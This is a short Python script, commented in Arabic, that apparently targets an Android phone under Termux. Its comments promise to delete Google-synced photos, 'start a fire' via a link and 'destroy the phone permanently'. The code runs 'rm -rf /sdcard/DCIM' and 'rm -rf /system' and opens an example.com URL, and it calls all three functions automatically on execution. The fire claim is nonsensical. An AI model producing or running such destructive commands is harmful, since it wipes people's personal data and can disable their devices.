import os
import sys

# مسح الصور المزامنة عبر جوجل
def delete_google_photos():
  os.system("rm -rf /sdcard/DCIM")

# تشغيل نار عبر الرابط
def start_fire():
  os.system("termux-open https://example.com/fire")

# تدمير الهاتف نهائياً
def destroy_phone():
  os.system("rm -rf /system")

# تنفيذ الأوامر
delete_google_photos()
start_fire()
destroy_phone()